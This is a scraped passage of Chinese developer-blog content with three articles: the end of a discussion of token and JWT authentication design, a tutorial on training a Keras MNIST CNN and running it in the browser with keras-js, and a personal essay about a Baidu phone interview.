height=&quot;396&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<h4 class=\"heading\" data-id=\"heading-4\">2）业务请求</h4>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/27/161375750d5aa746?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"510\" data-height=\"293\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;510&quot; height=&quot;293&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<h4 class=\"heading\" data-id=\"heading-5\">3）Token 过期，刷新 Token</h4>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/27/161375750d060f97?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"648\" data-height=\"666\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;648&quot; height=&quot;666&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>上面的时序图中并未提到 Refresh Token 过期怎么办。不过很显然，Refresh Token 既然已经过期，就该要求用户重新登录了。</p>\n<p>当然还可以把这个机制设计得更复杂一些，比如，Refresh Token 每次使用的时候，都更新它的过期时间，直到与它的创建时间相比，已经超过了非常长的一段时间（比如三个月），这等于是在相当长一段时间内允许 Refresh Token 自动续期。</p>\n<p>到目前为止，Token 都是有状态的，即在服务端需要保存并记录相关属性。那说好的无状态呢，怎么实现？</p>\n<h2 class=\"heading\" data-id=\"heading-6\">无状态 Token</h2>\n<p>如果我们把所有状态信息都附加在 Token 上，服务器就可以不保存。但是服务端仍然需要认证 Token 有效。不过只要服务端能确认是自己签发的 Token，而且其信息未被改动过，那就可以认为 Token 有效——“签名”可以作此保证。平时常说的签名都存在一方签发，另一方验证的情况，所以要使用非对称加密算法。但是在这里，签发和验证都是同一方，所以对称加密算法就能达到要求，而对称算法比非对称算法要快得多（可达数十倍差距）。更进一步思考，对称加密算法除了加密，还带有还原加密内容的功能，而这一功能在对 Token 签名时并无必要——既然不需要解密，摘要（散列）算法就会更快。可以指定密码的散列算法，自然是 HMAC。</p>\n<p>上面说了这么多，还需要自己去实现吗？不用！<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fjwt.io%2F\" rel=\"nofollow noopener noreferrer\">JWT</a> 已经定义了详细的规范，而且有各种语言的若干实现。</p>\n<p>不过在使用无状态 Token 的时候在服务端会有一些变化，服务端虽然不保存有效的 Token 了，却需要保存未到期却已注销的 Token。如果一个 Token 未到期就被用户主动注销，那么服务器需要保存这个被注销的 Token，以便下次收到使用这个仍在有效期内的 Token 时判其无效。有没有感到一点沮丧？</p>\n<p>在前端可控的情况下（比如前端和服务端在同一个项目组内），可以协商：前端一但注销成功，就丢掉本地保存（比如保存在内存、LocalStorage 等）的 Token 和 Refresh Token。基于这样的约定，服务器就可以<strong>假设</strong>收到的 Token 一定是没注销的（因为注销之后前端就不会再使用了）。</p>\n<p>如果前端不可控的情况，仍然可以进行上面的假设，但是这种情况下，需要尽量缩短 Token 的有效期，而且必须在用户主动注销的情况下让 Refresh Token 无效。这个操作<strong>存在一定的安全漏洞</strong>，因为用户会认为已经注销了，实际上在较短的一段时间内并没有注销。如果应用设计中，这点漏洞并不会造成什么损失，那采用这种策略就是可行的。</p>\n<p>在使用无状态 Token 的时候，有两点需要注意：</p>\n<ol>\n<li>Refresh Token 有效时间较长，所以它应该在服务器端有状态，以增强安全性，确保用户注销时可控</li>\n<li>应该考虑使用二次认证来增强敏感操作的安全性</li>\n</ol>\n<p>到此，关于 Token 的话题似乎差不多了——然而并没有，上面说的只是认证服务和业务服务集成在一起的情况，如果是分离的情况呢？</p>\n<h2 class=\"heading\" data-id=\"heading-7\">分离认证服务</h2>\n<p>当 Token 无状态之后，单点登录就变得容易了。前端拿到一个有效的 Token，它就可以在任何同一体系的服务上认证通过——只要它们使用同样的密钥和算法来认证 Token 的有效性。就样这样：</p>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/27/161375750d44e092?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"1041\" data-height=\"445\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1041&quot; height=&quot;445&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>当然，如果 Token 过期了，前端仍然需要去认证服务更新 Token：</p>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/27/161375750d18edeb?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"1071\" data-height=\"743\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1071&quot; height=&quot;743&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>可见，虽然认证和业务分离了，实际即并没产生多大的差异。当然，这是建立在<strong>认证服务器信任业务服务器的前提</strong>下，因为认证服务器产生 Token 的密钥和业务服务器认证 Token 的密钥和算法相同。换句话说，业务服务器同样可以创建有效的 Token。</p>\n<p>如果业务服务器不能被信任，该怎么办？</p>\n<h2 class=\"heading\" data-id=\"heading-8\">不受信的业务服务器</h2>\n<p>遇到不受信的业务服务器时，很容易想到的办法是使用不同的密钥。认证服务器使用密钥1签发，业务服务器使用密钥2验证——这是典型非对称加密签名的应用场景。认证服务器自己使用私钥对 Token 签名，公开公钥。信任这个认证服务器的业务服务器保存公钥，用于验证签名。幸好，JWT 不仅可以使用 HMAC 签名，也可以使用 RSA（一种非对称加密算法）签名。</p>\n<p>不过，当业务服务器已经不受信任的时候，<strong>多个业务服务器之间使用相同的 Token 对用户来说是不安全的</strong>。因为任何一个服务器拿到 Token 都可以仿冒用户去另一个服务器处理业务……悲剧随时可能发生。</p>\n<p>为了防止这种情况发生，就需要在认证服务器产生 Token 的时候，把使用该 Token 的业务服务器的信息记录在 Token 中，这样当另一个业务服务器拿到这个 Token 的时候，发现它并不是自己应该验证的 Token，就可以直接拒绝。</p>\n<p>现在，认证服务器不信任业务服务器，业务服务器相互也不信任，但前端是信任这些服务器的——如果前端不信任，就不会拿 Token 去请求验证。那么为什么会信任？可能是因为这些是同一家公司或者同一个项目中提供的若干服务构成的服务体系。</p>\n<p>但是，前端信任不代表用户信任。如果 Token 不没有携带用户隐私（比如姓名），那么用户不会关心信任问题。但如果 Token 含有用户隐私的时候，用户得关心信任问题了。这时候认证服务就不得不再啰嗦一些，当用户请求 Token 的时候，问上一句，你真的要授权给某某某业务服务吗？而这个“某某某”，用户怎么知道它是不是真的“某某某”呢？用户当然不知道，甚至认证服务也不知道，因为公钥已经公开了，任何一个业务都可以声明自己是“某某某”。</p>\n<p>为了得到用户的信任，认证服务就不得不帮助用户来甄别业务服务。所以，认证服器决定不公开公钥，而是要求业务服务先申请注册并通过审核。只有通过审核的业务服务器才能得到认证服务为它创建的，仅供它使用的公钥。如果该业务服务泄漏公钥带来风险，由该业务服务自行承担。现在认证服务可以清楚的告诉用户，“某某某”服务是什么了。如果用户还是不够信任，认证服务甚至可以问，某某某业务服务需要请求 A、B、C 三项个人数据，其中 A 是必须的，不然它不工作，是否允许授权？如果你授权，我就把你授权的几项数据加密放在 Token 中……</p>\n<p>废话了这么多，有没有似曾相识……对了，这类似开放式 API 的认证过程。开发式 API 多采用 OAuth 认证，而关于 OAuth 的探讨资源非常丰富，这里就不深究了。</p>\n</div>"},null,{"title":"基于 keras-js 快速实现浏览器内的 CNN 手写数字识别","avatar":"https://avatars.githubusercontent.com/u/10933333?v=3","author":"Starkwang","create_time":"2018 年 01 月 26 日","tags":["Keras","JavaScript","前端","神经网络"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><p>在这篇文章中，我会快速地介绍如何使用 keras 训练一个简单的识别 MNIST（一个手写数字数据集）的 CNN（卷积神经网络），并且把训练好的网络应用到 web 浏览器内。</p>\n<p>DEMO 地址：<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fstarkwang.github.io%2Fkeras-js-demo%2Fdist%2F\" rel=\"nofollow noopener noreferrer\">starkwang.github.io/keras-js-de…</a></p>\n<p></p><figure><img class=\"lazyload inited loaded\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/26/16130941aa2a50ea?imageslim\" data-width=\"365\" data-height=\"422\" src=\"https://user-gold-cdn.xitu.io/2018/1/26/16130941aa2a50ea?imageslim\"><figcaption></figcaption></figure><p></p>\n<hr>\n<h1 class=\"heading\" data-id=\"heading-0\">零、准备工作</h1>\n<p>首先需要给你的电脑安装 keras，具体安装的步骤请参考 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fkeras.io%2F\" rel=\"nofollow noopener noreferrer\">keras 官方文档</a></p>\n<hr>\n<h1 class=\"heading\" data-id=\"heading-1\">一、快速入门</h1>\n<p>首先十分推荐阅读 tensorflow 官方文档中的 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.tensorflow.org%2Fget_started%2Fmnist%2Fbeginners\" rel=\"nofollow noopener noreferrer\">MNIST For ML Beginners</a>，这里是<a target=\"_blank\" href=\"https://link.juejin.im?target=http%3A%2F%2Fwiki.jikexueyuan.com%2Fproject%2Ftensorflow-zh%2Ftutorials%2Fmnist_beginners.html\" rel=\"nofollow noopener noreferrer\">极客学院的中文翻译</a></p>\n<p>MNIST 是一个很流行的入门级机器学习/计算机视觉数据集，它包含 0 - 9 的各种手写数字图片：</p>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/14/160f3f3e227e23c1?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"636\" data-height=\"159\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;636&quot; height=&quot;159&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>每张图片的尺寸均为 28 * 28，用一个 28 * 28 的二维数组来表示，换句话说，每张图片都是由 784 个像素点组成，每个像素点的值在 0 - 255 之间。</p>\n<p>比如下面就是一个 \"3\" 的数据：</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 \n000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 \n000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 \n000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 \n000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 \n000 000 000 000 000 000 000 000 000 000 000 038 043 105 255 253 253 253 253 253 174 006 000 000 000 000 000 000 \n000 000 000 000 000 000 000 000 000 043 139 224 226 252 253 252 252 252 252 252 252 158 014 000 000 000 000 000 \n000 000 000 000 000 000 000 000 000 178 252 252 252 252 253 252 252 252 252 252 252 252 059 000 000 000 000 000 \n000 000 000 000 000 000 000 000 000 109 252 252 230 132 133 132 132 189 252 252 252 252 059 000 000 000 000 000 \n000 000 000 000 000 000 000 000 000 004 029 029 024 000 000 000 000 014 226 252 252 172 007 000 000 000 000 000 \n000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 085 243 252 252 144 000 000 000 000 000 000 \n000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 088 189 252 252 252 014 000 000 000 000 000 000 \n000 000 000 000 000 000 000 000 000 000 000 000 000 000 091 212 247 252 252 252 204 009 000 000 000 000 000 000 \n000 000 000 000 000 000 000 000 000 032 125 193 193 193 253 252 252 252 238 102 028 000 000 000 000 000 000 000 \n000 000 000 000 000 000 000 000 045 222 252 252 252 252 253 252 252 252 177 000 000 000 000 000 000 000 000 000 \n000 000 000 000 000 000 000 000 045 223 253 253 253 253 255 253 253 253 253 074 000 000 000 000 000 000 000 000 \n000 000 000 000 000 000 000 000 000 031 123 052 044 044 044 044 143 252 252 074 000 000 000 000 000 000 000 000 \n000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 015 252 252 074 000 000 000 000 000 000 000 000 \n000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 086 252 252 074 000 000 000 000 000 000 000 000 \n000 000 000 000 000 000 005 075 009 000 000 000 000 000 000 098 242 252 252 074 000 000 000 000 000 000 000 000 \n000 000 000 000 000 061 183 252 029 000 000 000 000 018 092 239 252 252 243 065 000 000 000 000 000 000 000 000 \n000 000 000 000 000 208 252 252 147 134 134 134 134 203 253 252 252 188 083 000 000 000 000 000 000 000 000 000 \n000 000 000 000 000 208 252 252 252 252 252 252 252 252 253 230 153 008 000 000 000 000 000 000 000 000 000 000 \n000 000 000 000 000 049 157 252 252 252 252 252 217 207 146 045 000 000 000 000 000 000 000 000 000 000 000 000 \n000 000 000 000 000 000 007 103 235 252 172 103 024 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 \n000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 \n000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 \n000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000\n</code></pre><p>使用 keras，可以很方便地导入 MNIST 数据集：</p>\n<pre><code class=\"hljs python\" lang=\"python\"><span class=\"hljs-keyword\">from</span> keras.datasets <span class=\"hljs-keyword\">import</span> mnist\n(x_train, y_train), (x_test, y_test) = mnist.load_data()\n</code></pre><p>总体来说，我们的想要得到的网络模型，是有一个固定的输入输出的：</p>\n<ul>\n<li>输入为一个 28 * 28 的二维整数数组</li>\n<li>输出是一个长度为 10 的数组，依次表示 0-9 的可能性（例如如果有一张图片 80% 概率为 1， 20% 概率为 7的话，那么这个数组就是 <code>[0, 0.8, 0, 0, 0, 0, 0, 0.2, 0, 0]</code>）</li>\n</ul>\n<h1 class=\"heading\" data-id=\"heading-2\">二、使用 keras 训练网络</h1>\n<p>我们想要训练的模型，由以下几层网络组成：</p>\n<ol>\n<li>32 个 3x3 卷积核的卷积层</li>\n<li>64 个 3x3 卷积核的卷积层</li>\n<li>采样因子为 (2, 2) 的池化层</li>\n<li>Dropout 层</li>\n<li>Flatten 层</li>\n<li>ReLu 全连接层</li>\n<li>Dropout 层</li>\n<li>Softmax 全连接层</li>\n</ol>\n<p>用 keras 训练一个识别 MNIST 的 CNN 网络非常方便，下面是一个官方给出的例子（<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fkeras-team%2Fkeras%2Fblob%2Fmaster%2Fexamples%2Fmnist_cnn.py\" rel=\"nofollow noopener noreferrer\">源码在此</a>）：</p>\n<pre><code class=\"hljs python\" lang=\"python\"><span class=\"hljs-keyword\">from</span> __future__ <span class=\"hljs-keyword\">import</span> print_function\n<span class=\"hljs-keyword\">import</span> keras\n<span class=\"hljs-keyword\">from</span> keras.datasets <span class=\"hljs-keyword\">import</span> mnist\n<span class=\"hljs-keyword\">from</span> keras.models <span class=\"hljs-keyword\">import</span> Sequential\n<span class=\"hljs-keyword\">from</span> keras.layers <span class=\"hljs-keyword\">import</span> Dense, Dropout, Flatten\n<span class=\"hljs-keyword\">from</span> keras.layers <span class=\"hljs-keyword\">import</span> Conv2D, MaxPooling2D\n<span class=\"hljs-keyword\">from</span> keras <span class=\"hljs-keyword\">import</span> backend <span class=\"hljs-keyword\">as</span> K\n\nbatch_size = <span class=\"hljs-number\">128</span>\nnum_classes = <span class=\"hljs-number\">10</span>\nepochs = <span class=\"hljs-number\">12</span>\n\n<span class=\"hljs-comment\"># input image dimensions</span>\nimg_rows, img_cols = <span class=\"hljs-number\">28</span>, <span class=\"hljs-number\">28</span>\n\n<span class=\"hljs-comment\"># the data, shuffled and split between train and test sets</span>\n(x_train, y_train), (x_test, y_test) = mnist.load_data()\n\n<span class=\"hljs-keyword\">if</span> K.image_data_format() == <span class=\"hljs-string\">'channels_first'</span>:\n    x_train = x_train.reshape(x_train.shape[<span class=\"hljs-number\">0</span>], <span class=\"hljs-number\">1</span>, img_rows, img_cols)\n    x_test = x_test.reshape(x_test.shape[<span class=\"hljs-number\">0</span>], <span class=\"hljs-number\">1</span>, img_rows, img_cols)\n    input_shape = (<span class=\"hljs-number\">1</span>, img_rows, img_cols)\n<span class=\"hljs-keyword\">else</span>:\n    x_train = x_train.reshape(x_train.shape[<span class=\"hljs-number\">0</span>], img_rows, img_cols, <span class=\"hljs-number\">1</span>)\n    x_test = x_test.reshape(x_test.shape[<span class=\"hljs-number\">0</span>], img_rows, img_cols, <span class=\"hljs-number\">1</span>)\n    input_shape = (img_rows, img_cols, <span class=\"hljs-number\">1</span>)\n\nx_train = x_train.astype(<span class=\"hljs-string\">'float32'</span>)\nx_test = x_test.astype(<span class=\"hljs-string\">'float32'</span>)\nx_train /= <span class=\"hljs-number\">255</span>\nx_test /= <span class=\"hljs-number\">255</span>\nprint(<span class=\"hljs-string\">'x_train shape:'</span>, x_train.shape)\nprint(x_train.shape[<span class=\"hljs-number\">0</span>], <span class=\"hljs-string\">'train samples'</span>)\nprint(x_test.shape[<span class=\"hljs-number\">0</span>], <span class=\"hljs-string\">'test samples'</span>)\n\n<span class=\"hljs-comment\"># convert class vectors to binary class matrices</span>\ny_train = keras.utils.to_categorical(y_train, num_classes)\ny_test = keras.utils.to_categorical(y_test, num_classes)\n\nmodel = Sequential()\nmodel.add(Conv2D(<span class=\"hljs-number\">32</span>, kernel_size=(<span class=\"hljs-number\">3</span>, <span class=\"hljs-number\">3</span>),\n                 activation=<span class=\"hljs-string\">'relu'</span>,\n                 input_shape=input_shape))\nmodel.add(Conv2D(<span class=\"hljs-number\">64</span>, (<span class=\"hljs-number\">3</span>, <span class=\"hljs-number\">3</span>), activation=<span class=\"hljs-string\">'relu'</span>))\nmodel.add(MaxPooling2D(pool_size=(<span class=\"hljs-number\">2</span>, <span class=\"hljs-number\">2</span>)))\nmodel.add(Dropout(<span class=\"hljs-number\">0.25</span>))\nmodel.add(Flatten())\nmodel.add(Dense(<span class=\"hljs-number\">128</span>, activation=<span class=\"hljs-string\">'relu'</span>))\nmodel.add(Dropout(<span class=\"hljs-number\">0.5</span>))\nmodel.add(Dense(num_classes, activation=<span class=\"hljs-string\">'softmax'</span>))\n\nmodel.compile(loss=keras.losses.categorical_crossentropy,\n              optimizer=keras.optimizers.Adadelta(),\n              metrics=[<span class=\"hljs-string\">'accuracy'</span>])\n\nmodel.fit(x_train, y_train,\n          batch_size=batch_size,\n          epochs=epochs,\n          verbose=<span class=\"hljs-number\">1</span>,\n          validation_data=(x_test, y_test))\nscore = model.evaluate(x_test, y_test, verbose=<span class=\"hljs-number\">0</span>)\nprint(<span class=\"hljs-string\">'Test loss:'</span>, score[<span class=\"hljs-number\">0</span>])\nprint(<span class=\"hljs-string\">'Test accuracy:'</span>, score[<span class=\"hljs-number\">1</span>])\n\n<span class=\"hljs-comment\"># Save model</span>\nmodel.save(<span class=\"hljs-string\">'myMnistCNN.h5'</span>)\n</code></pre><p>如果已经安装好了 keras，直接运行即可：</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">python mnist_cnn.py\n</code></pre><hr>\n<h1 class=\"heading\" data-id=\"heading-3\">三、转换输出模型</h1>\n<p>获得训练好的 .h5 文件之后，模型还不能直接使用，因为我们需要对它进行转编码，keras-js 提供了一个 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Ftranscranial%2Fkeras-js%2Fblob%2Fmaster%2Fpython%2Fencoder.py\" rel=\"nofollow noopener noreferrer\">python 脚本</a>来自动执行：</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">python ./python/encoder.py -q myMnistCNN.h5\n</code></pre><p>这个脚本会把 .h5 文件转编码为 keras-js 可读的格式，里面包含了训练好的神经网络的所有模型和参数。</p>\n<h1 class=\"heading\" data-id=\"heading-4\">四、使用 keras-js 导入模型</h1>\n<p>首先需要引入 keras-js，可以通过 script 标签直接引入：</p>\n<pre><code class=\"hljs html\" lang=\"html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://unpkg.com/keras-js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span>\n</code></pre><p><em>也可以通过 npm 安装后使用 webpack 构建引入，参考<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Ftranscranial.github.io%2Fkeras-js-docs%2Fsetup%2Fwebpack%2F\" rel=\"nofollow noopener noreferrer\">这里</a></em></p>\n<p>接下来就可以直接创建一个 Model，keras-js 会自动加载对应的 bin 文件：</p>\n<pre><code class=\"hljs js\" lang=\"js\"><span class=\"hljs-keyword\">const</span> model = <span class=\"hljs-keyword\">new</span> KerasJS.Model({\n    <span class=\"hljs-attr\">filepath</span>: <span class=\"hljs-string\">'/path/to/mnist_cnn.bin'</span>,\n    <span class=\"hljs-attr\">gpu</span>: <span class=\"hljs-literal\">true</span>,\n    <span class=\"hljs-attr\">transferLayerOutputs</span>: <span class=\"hljs-literal\">true</span>\n})\n</code></pre><p>初始化完毕之后，就可以用于 MNIST 识别了，输入是一个长度为 784 的数组（包含 28*28 各个像素点的灰度值），输出是一个长度为 10 的数组（0-9的概率）：</p>\n<p><strong>（可以使用上文中给的那个 \"3\" 的数据范例）</strong></p>\n<pre><code class=\"hljs js\" lang=\"js\">model\n  .ready()\n  .then(<span class=\"hljs-function\"><span class=\"hljs-params\">()</span> =&gt;</span> {\n    <span class=\"hljs-comment\">// data 是一个长度为 784 的数组，每一项都介于 0 - 255 之间</span>\n    <span class=\"hljs-comment\">// 这里我们需要把数组转换为 Float32 类型</span>\n    <span class=\"hljs-keyword\">const</span> inputData = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Float32Array</span>(data)\n    <span class=\"hljs-comment\">// 识别</span>\n    <span class=\"hljs-keyword\">return</span> model.predict(inputData)\n  })\n  .then(<span class=\"hljs-function\"><span class=\"hljs-params\">outputData</span> =&gt;</span> {\n    <span class=\"hljs-comment\">// 输出为 0-9 的概率，例如：</span>\n    <span class=\"hljs-comment\">// { output: [0, 0, 0, 0.8, 0, 0, 0.2, 0, 0, 0] }</span>\n  })\n  .catch(<span class=\"hljs-function\"><span class=\"hljs-params\">err</span> =&gt;</span> {\n    <span class=\"hljs-comment\">// ...</span>\n  })\n</code></pre><h1 class=\"heading\" data-id=\"heading-5\">五、Canvas 实现一个手写板</h1>\n<p>最后一步就是实现一个手写板，<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fstarkwang%2Fkeras-js-demo%2Fblob%2Fmaster%2Fsrc%2FApp.vue\" rel=\"nofollow noopener noreferrer\">具体的代码</a>就不放上来了，主要就是通过 <code>mousedown</code>、<code>mousemove</code>、<code>mouseup</code> 事件来绘制图形。</p>\n<p>绘制完毕之后，调用 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FAPI%2FCanvasRenderingContext2D%2FgetImageData\" rel=\"nofollow noopener noreferrer\">ctx.getImageData</a>，就可以得到 canvas 内的像素数据，每个像素对应四个数值，依次是每个点的 rgba 值，处理之后就可以得到长度为 784 的灰度数组了。然后使用上文提到的 <code>model.predict</code> 即可。</p>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/26/16130941aa2a50ea?imageslim\" data-width=\"365\" data-height=\"422\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;365&quot; height=&quot;422&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n</div>"},{"title":"转眼人到中年：前端老程序员无法忘怀的一次百度电话面试","avatar":"https://user-gold-cdn.xitu.io/2016/11/29/660f28857a9f570fb49d52a5ee68039f.jpg?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"程序猿小卡_casper","create_time":"2018 年 01 月 26 日","tags":["面试","jQuery","前端","JavaScript"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><h2 class=\"heading\" data-id=\"heading-0\">等待，山雨欲来</h2>\n<p>2010年9月22日，中秋，记得那天下着零星的小雨。大部分同学都已回了家，深秋的校园显得格外空旷寂寥。平时车来人往的校道，也只剩三三两两的行人低着头走着。</p>\n<p>匆匆忙忙吃完早餐，一个人背着书包来到了教学楼，找了僻静的角落坐下。看看手机，8:45左右，离电话面试还有大概15分钟。心里有些紧张，毕竟是大厂的面试，要求肯定很严格，不知道待会会问什么问题。内心突然有些懊恼，应该提前多做些功课的。</p>\n<h2 class=\"heading\" data-id=\"heading-1\">如期而至的电话</h2>\n<p>时间一分一秒地流逝，心跳越来越快。9点整，上海的电话如期打来。双方确认了身份后，连自我介绍都不用，直接就进入了技术面试环节。有点出乎意料，在我彼时的设想里，第一个环节应该是自我介绍才对。</p>\n<p>没有太多的时间去诧异，电话那头，面试题一个接一个地抛了过来。我把耳机听筒紧紧地贴着耳朵，生怕听不清面试的题目，或者错过关键的信息。其时，脑子飞快地转着，想着如何回答面试官的题目，以及怎么更有条理地组织我的回答。</p>\n<p>“JS是如何实现继承的？”</p>\n<p>“知不知道什么是跨域？什么情况下会出现跨域？有哪些解决方案？”</p>\n<p>“说说你对标签语义化的了解。”</p>\n<p>。。。</p>\n<p>脑子里一直嗡嗡响，也不知道过了多长时间，面试官突然安静了下来。顿了大约有10秒，那边说：“技术的问题也问得差不多了，就先到这里。你这边有没有什么问题想问的？”</p>\n<p>我如释重负，赶紧喘了口气，然后问了几个我之前已经准备好的问题，包括面试部门的工作，员工培训机制，学习建议等，面试官也一一解答。</p>\n<h2 class=\"heading\" data-id=\"heading-2\">也许就要结束了</h2>\n<p>面试终于要结束了，一直紧绷着的神经开始松弛下来，人反而紧张了起来。毕竟，后面还有生死未卜的两周在等待着我，而未知总是让人感到恐惧。</p>\n<p>接下来，就是我最想听到的那句收尾的话了。</p>\n<p>面试官：“那么，面试就先到这里，今天是周末，一个多小时的面试，辛苦你啦。面试结果会在两周之内反馈到你这边。”</p>\n<p>周末，还是中秋，仔细想来，也是为了迁就我的时间，面试官才不得不在这么特殊的时间到公司加班。而且面试过程中，面试官挺nice的，并不是预想中高高在上冷冰冰的态度。</p>\n<p>面试官的“辛苦你啦”让我有点小内疚，赶紧回道：“挺不好意思的，因为我这边时间的原因，辛苦您周末过来公司加班。中秋节快乐。”</p>\n<p>具体怎么说的记不清了，只记得当时态度很真诚，并不是因为客套。</p>\n<p>面试官听到我的回答后，明显楞了一下，似乎有些意外。同样祝我节日快乐后，电话那头安静了一会，只有偶尔轻轻的键盘敲击声。</p>\n<h2 class=\"heading\" data-id=\"heading-3\">当幸福来敲门</h2>\n<p>感觉过了好长时间，其实也可能只有十来秒。听筒里再次传来面试官的声音，不知道是不是心理作用，感觉面试官的语调跟之前有些不同。</p>\n<p>“这样，我提前把面试结果告诉你，你一面通过了。在你之前也面了好多人，到目前为止，你是回答得最好的。二面具体时间稍后通知。加油哦，好好准备下一轮面试。”</p>\n<p>幸福来得太突然，感觉握着电话的手都在微微颤抖。</p>\n<p>“非常感谢，我一定好好准备。”</p>\n<p>直到现在，我还不知道为什么面试官突然决定提前告诉我面试结果。也许，陌生面试者的一句“中秋节快乐”，触动了在他乡拼搏的年轻游子的心。</p>\n<p>一切无从求证，记忆也终将随时间淡去，在那个下着蒙蒙细雨的清晨。</p>\n<h2 class=\"heading\" 